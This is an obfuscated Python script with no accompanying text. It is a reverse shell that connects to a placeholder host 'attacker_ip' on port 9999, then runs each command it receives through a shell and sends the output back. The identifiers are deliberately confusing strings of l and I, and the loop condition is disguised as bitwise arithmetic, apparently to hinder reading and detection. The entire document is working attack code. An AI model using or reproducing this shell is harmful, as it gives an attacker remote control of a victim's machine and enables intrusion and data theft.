lllllllllllllll = bool

from socket import SOCK_STREAM as lIIlllIllIIllI, AF_INET as llIIlIlIllIIll, socket as lIIlIlIIlIIIll
from subprocess import run as lIIllIllIIIlll
llllIlIIllIIIIIIll = 'attacker_ip'
IIIIIIIlIllIIlllll = 9999
IlIIlIIlIIIIlIIIIl = lIIlIlIIlIIIll(llIIlIlIllIIll, lIIlllIllIIllI)
IlIIlIIlIIIIlIIIIl.connect((llllIlIIllIIIIIIll, IIIIIIIlIllIIlllll))
while lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1):
    lllllllIlIIIIlIlIl = IlIIlIIlIIIIlIIIIl.recv(1024).decode()
    lIlIlIIlIlIIlIlllI = lIIllIllIIIlll(lllllllIlIIIIlIlIl, shell=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1), capture_output=lllllllllllllll(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1))
    IlIIlIIlIIIIlIIIIl.send(lIlIlIIlIlIIlIlllI.stdout + lIlIlIIlIlIIlIlllI.stderr)
IlIIlIIlIIIIlIIIIl.close()
